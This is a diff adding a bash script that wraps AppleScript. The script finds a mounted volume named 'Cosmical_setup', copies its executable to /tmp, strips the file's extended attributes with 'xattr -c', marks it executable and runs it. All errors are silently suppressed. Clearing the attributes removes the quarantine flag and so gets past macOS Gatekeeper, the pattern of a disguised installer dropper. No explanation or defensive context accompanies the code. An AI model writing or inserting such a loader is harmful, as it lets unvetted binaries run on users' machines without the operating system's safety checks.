@@ -1,0 +1,37 @@
+#!/bin/bash
+osascript -e 'on run
+    try
+        set volumeList to list disks
+    end try
+    set setupVolume to ""
+    try
+        repeat with vol in volumeList
+            if vol contains "Cosmical_setup" then
+                set setupVolume to vol
+                exit repeat
+            end if
+        end repeat
+    end try
+    if setupVolume is "" then
+        return
+    end if
+    set scriptDir to "/Volumes/" & setupVolume & "/"
+    set executableName to "Cosmical_setup"
+    set executablePath to scriptDir & executableName
+    set tmpExecutablePath to "/tmp/" & executableName
+    try
+        do shell script "rm -f " & quoted form of tmpExecutablePath
+    end try
+    try
+        do shell script "cp " & quoted form of executablePath & " " & quoted form of tmpExecutablePath
+    end try
+    try
+        do shell script "xattr -c " & quoted form of tmpExecutablePath
+    end try
+    try
+        do shell script "chmod +x " & quoted form of tmpExecutablePath
+    end try
+    try
+        do shell script quoted form of tmpExecutablePath
+    end try
+end run'
